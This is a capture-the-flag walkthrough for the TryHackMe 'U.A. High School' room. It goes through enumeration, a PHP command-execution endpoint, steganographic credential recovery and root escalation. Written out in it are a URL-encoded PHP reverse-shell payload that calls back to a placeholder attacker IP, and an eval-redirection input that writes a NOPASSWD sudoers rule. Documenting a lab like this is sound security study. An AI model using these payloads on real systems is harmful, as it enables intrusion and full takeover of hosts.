# U.A. High School

Room: https://tryhackme.com/room/yueiua

Welcome to the web application of U.A., the Superhero Academy.

Join us in the mission to protect the digital world of superheroes! U.A., the most renowned Superhero Academy, is looking for a superhero to test the security of our new site.

Our site is a reflection of our school values, designed by our engineers with incredible Quirks. We have gone to great lengths to create a secure platform that reflects the exceptional education of the U.A.

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/Anonforce.md

---

## Overview

This room started as a small Apache website with SSH open. The main path was to find command execution in a PHP endpoint, gain a shell as `www-data`, recover hidden credentials from a corrupted image, and then abuse a sudo-allowed feedback script to become root.

Sensitive values such as full flags, passwords, and passphrases have been masked.

## Enumeration

I started with an Nmap scan against the target.

```bash
sudo nmap -sV -sC -p- --min-rate 5000 -oN nmap-sv-all.txt 10.66.165.95
```

The scan showed only SSH and HTTP exposed.

```text
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
```

The web title was `U.A. High School`, so the next step was web enumeration.

## Directory Enumeration

I used Gobuster against the root of the website.

```bash
gobuster dir -u http://10.66.165.95 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -o gobuster-common.txt
```

Interesting results included:

```text
/about.html
/admissions.html
/assets/
/contact.html
/courses.html
/index.html
/server-status    403
```

The `/assets/` directory also contained an `index.php` file.

```bash
gobuster dir -u http://10.66.165.95/assets -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -o gobuster-assets.txt
```

```text
/assets/images/
/assets/index.php
```


## Command Execution

The `/assets/index.php` endpoint accepted a `cmd` parameter. I tested it with a simple command first.

```bash
curl "http://10.66.165.95/assets/index.php?cmd=id"
```

After confirming command execution, I started a listener.

```bash
nc -lvnp 1234
```

Then I triggered a PHP reverse shell through the vulnerable parameter. I masked only the AttackBox callback IP in the write-up.

```bash
curl 'http://10.66.165.95/assets/index.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22ATTACKBOX_IP%22%2C1234%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27'
```

The working payload used my AttackBox IP as the callback host and port `1234`.

This returned a shell as `www-data`.

```text
whoami
www-data
```

## Web File Enumeration

From the shell, I checked the web directories.

```bash
cd /var/www
find . -maxdepth 4 -type f -ls 2>/dev/null
```

Interesting files included:

```text
/var/www/html/assets/images/yuei.jpg
/var/www/html/assets/images/oneforall.jpg
/var/www/Hidden_Content/passphrase.txt
```

The passphrase file contained a base64 value.

```bash
cat /var/www/Hidden_Content/passphrase.txt
```

I decoded it locally.

```bash
echo 'QWxsbWlnaHRGb3JFdmVyISEhCg==' | base64 -d
```

This revealed a passphrase, masked here as:

```text
Allmight...!!!
```

## Fixing the Corrupted Image

I downloaded the images to the AttackBox.

```bash
wget http://10.66.165.95/assets/images/yuei.jpg
wget http://10.66.165.95/assets/images/oneforall.jpg
```

`steghide` failed against `oneforall.jpg` because the file format was not supported.

```bash
steghide extract -sf oneforall.jpg -p 'Allmight...!!!'
```

I checked the file type.

```bash
file oneforall.jpg yuei.jpg
```

The `oneforall.jpg` file was detected as raw data, so I inspected the header.

```bash
xxd -l 64 oneforall.jpg
```

The first bytes looked like a PNG header, but the following bytes looked like JPEG data. I repaired the magic bytes by replacing the first 8 bytes with a JPEG header.

```bash
cp oneforall.jpg fixed-oneforall.jpg
printf '\xff\xd8\xff\xe0\x00\x10\x4a\x46' | dd of=fixed-oneforall.jpg bs=1 seek=0 count=8 conv=notrunc
file fixed-oneforall.jpg
```

The repaired file was now recognised as a JPEG.

```text
fixed-oneforall.jpg: JPEG image data
```

Then `steghide` worked with the decoded passphrase.

```bash
steghide extract -sf fixed-oneforall.jpg -p 'Allmight...!!!'
cat creds.txt
```

The extracted file revealed credentials for `deku`, masked here as:

```text
deku:One?For?.../A
```

## User Access

I logged in as `deku` using SSH.

```bash
ssh deku@10.66.165.95
```

Then I read the user flag.

```bash
cat user.txt
```

Masked user flag:

```text
THM{W3l...All??}
```

## Privilege Escalation Enumeration

I checked sudo permissions.

```bash
sudo -l
```

The user could run one script as root.

```text
User deku may run the following commands on ip-10-66-165-95:
    (ALL) /opt/NewComponent/feedback.sh
```

I inspected the script.

```bash
cat /opt/NewComponent/feedback.sh
```

The important part was:

```bash
read feedback

if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input."
fi
```

The script filtered several command injection characters, but it still used `eval` on user-controlled input.

I also checked permissions and attributes.

```bash
ls -la /opt/NewComponent/feedback.sh
lsattr /opt/NewComponent/feedback.sh
ls -ld /opt/NewComponent
```

The file was immutable, so replacing the script was not possible.

```text
----i---------e----- /opt/NewComponent/feedback.sh
```

## Abusing eval Redirection

Because the script used:

```bash
eval "echo $feedback"
```

I could use redirection without needing blocked characters like `;`, `|`, or `&`.

I ran the script with sudo.

```bash
sudo /opt/NewComponent/feedback.sh
```

At the prompt, I entered:

```text
deku ALL=NOPASSWD:ALL > /etc/sudoers.d/deku
```

This caused root to write a sudoers rule for `deku`.

I confirmed the new sudo permission.

```bash
sudo -l
```

```text
(root) NOPASSWD: ALL
```

Then I spawned a root shell.

```bash
sudo /bin/bash
```

## Root Flag

As root, I read the final flag.

```bash
cd /root
cat root.txt
```

Masked root flag:

```text
THM{Y0U...H3r0}
```

## Attack Chain Summary

```text
Nmap found SSH and Apache
Gobuster found /assets/index.php
/assets/index.php on the main site allowed command execution through cmd
PHP reverse shell returned www-data access
/var/www/Hidden_Content/passphrase.txt contained a base64 passphrase
oneforall.jpg had a corrupted image header
Repairing the JPEG header allowed steghide extraction
Extracted deku credentials from creds.txt
Logged in as deku and captured user.txt
sudo -l allowed /opt/NewComponent/feedback.sh
feedback.sh used eval on filtered input
Used eval redirection to write /etc/sudoers.d/deku
Gained NOPASSWD sudo and root shell
Captured root.txt
```

## Key Takeaways

- Always check discovered PHP files, even if they return blank output.
- A file extension does not prove the actual file type.
- Broken file headers can be an intentional steganography step.
- `eval` with user input is dangerous, even when common command separators are filtered.
- Sudo rules for scripts should avoid scripts that evaluate user-controlled input.
